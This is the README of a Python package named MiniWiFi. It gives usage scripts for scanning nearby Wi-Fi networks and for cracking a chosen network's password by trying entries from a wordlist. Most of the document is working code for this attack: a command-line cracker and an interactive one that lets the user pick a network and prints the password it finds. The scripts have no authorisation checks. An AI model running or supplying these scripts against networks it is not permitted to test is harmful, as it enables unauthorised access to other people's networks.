# MiniWiFi - Python Wi-Fi Security Toolkit

![Python Version](https://img.shields.io/badge/python-3.7+-blue.svg)
![License](https://img.shields.io/badge/license-MIT-green.svg)

MiniWiFi is a Python package for Wi-Fi network scanning and security testing. It provides a clean API for working with Wi-Fi networks programmatically.

## Features

- Scan for available Wi-Fi networks
- Attempt to connect to networks using password lists
- Pure Python implementation using pywifi
- Clean API for integration with other tools
- No external dependencies beyond pywifi

## Installation

```bash
pip install miniwifi
```

**Usage Examples** :

1. **network_scanner.py** :

```python
from miniwifi import WifiScanner

scanner = WifiScanner()
try:
    networks = scanner.scan_networks()
    print("Available Networks:")
    for i, ssid in enumerate(networks, 1):
        print(f"{i}. {ssid}")
except Exception as e:
    print(f"Error: {str(e)}")
```

2. **wifi_cracker.py** :

```python
from miniwifi import WifiCracker
import sys

def main(ssid, wordlist_path):
    cracker = WifiCracker()
    try:
        result = cracker.crack(ssid, wordlist_path)
        if result['success']:
            print(f"\nPassword found: {result['password']}")
            print(f"Attempts: {result['attempt']} | Time: {result['elapsed']:.2f}s")
        else:
            print("\nPassword not found")
            print(f"Total attempts: {result['attempt']} | Time: {result['elapsed']:.2f}s")
    except Exception as e:
        print(f"\nError: {str(e)}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python wifi_cracker.py <SSID> <WORDLIST_PATH>")
        sys.exit(1)
    main(sys.argv[1], sys.argv[2])
```

3. **interactive_cracker.py** :

```python
from miniwifi import WifiScanner, WifiCracker

def display_networks(networks):
    print("\nAvailable Networks:")
    for i, ssid in enumerate(networks, 1):
        print(f"{i}. {ssid}")

def main():
    scanner = WifiScanner()
    networks = scanner.scan_networks()
    display_networks(networks)
    
    try:
        choice = int(input("\nSelect network number: ")) - 1
        ssid = networks[choice]
        wordlist = input("Enter wordlist path: ")
        
        cracker = WifiCracker()
        print(f"\nCracking {ssid}... (Press Ctrl+C to stop)")
        
        result = cracker.crack(ssid, wordlist)
        if result['success']:
            print(f"\nSUCCESS! Password: {result['password']}")
        else:
            print("\nPassword not found in wordlist")
        print(f"Attempts: {result['attempt']} | Time: {result['elapsed']:.2f}s")
    except (ValueError, IndexError):
        print("Invalid selection")
    except KeyboardInterrupt:
        print("\nOperation cancelled by user")
    except Exception as e:
        print(f"Error: {str(e)}")

if __name__ == "__main__":
    main()
```

## License

MIT License - See LICENSE file

### Author

MrFidal - mrfidal@proton.me
Project URL: https://github.com/mr-fidal/miniwifi